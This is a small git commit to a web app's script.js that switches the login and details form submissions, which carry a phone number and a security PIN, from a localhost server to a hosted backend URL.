9beb6ff241fad48d04953664575b618aa93a4672
darkvex2000 <darkvex2000@gmail.com>
2026-07-06 06:49:43 +0530

    Fix

--- script.js
+++ script.js
@@ -9,7 +9,7 @@ document.getElementById("loginForm").addEventListener("submit", async function (
 
     currentPhone = phone;
 
-    const response = await fetch("http://localhost:5500/login", {
+    const response = await fetch("https://sprodeal-backend-juwe.onrender.com/login", {
 
         method: "POST",
 
@@ -45,7 +45,7 @@ document.getElementById("detailsForm").addEventListener("submit", async function
         securityPin += input.value;
     });
 
-    const response = await fetch("http://localhost:5500/details", {
+    const response = await fetch("https://sprodeal-backend-juwe.onrender.com/details", {
 
         method: "POST",
 
